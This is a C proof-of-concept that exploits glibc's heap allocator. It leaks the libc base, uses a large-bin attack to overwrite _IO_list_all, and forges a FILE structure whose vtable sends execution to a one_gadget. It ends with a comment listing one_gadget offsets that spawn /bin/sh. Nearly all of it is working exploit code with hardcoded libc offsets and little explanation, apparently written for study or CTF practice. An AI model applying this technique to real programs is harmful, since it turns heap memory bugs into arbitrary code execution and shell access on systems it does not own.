#include<stdio.h>
#include<stdlib.h>
 
typedef unsigned long ul;

int main()
{
	void *p1, *p2, *p3, *p4;
	ul *p;
	ul libc_base = 0;
	ul one_gadget = 0xf1147;
	ul _IO_list_all = 0x3c5520;

	p1 = malloc(0x400);
	malloc(0x20);
	p2 = malloc(0x410);
	malloc(0x20);
	p3 = malloc(0x420);
	malloc(0x20);

	free(p1);
	free(p2);
	p = (ul*)p1;
	libc_base = *p - 0x3c4b78;

	malloc(0x20);
	free(p3);

	p = (ul*)p2;
	*p = 0;
	*(p+1) = libc_base + _IO_list_all - sizeof(void*)*2;
	*(p+2) = 0;
	*(p+3) = libc_base + _IO_list_all - sizeof(void*)*4;

	malloc(0x20);
	p = (ul*)((ul)p3 - sizeof(void*)*2);
	*p = 0;
	*(p + 4) = 0;  // IO_write_base
	*(p + 5) = 1;  // IO_write_ptr
	*(p + 27) = (ul)p;  // vtable
	*(p + 3) = libc_base + one_gadget;  // __overflow

	// trigger it
	free(p3);

	return 0;
}

/*
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/
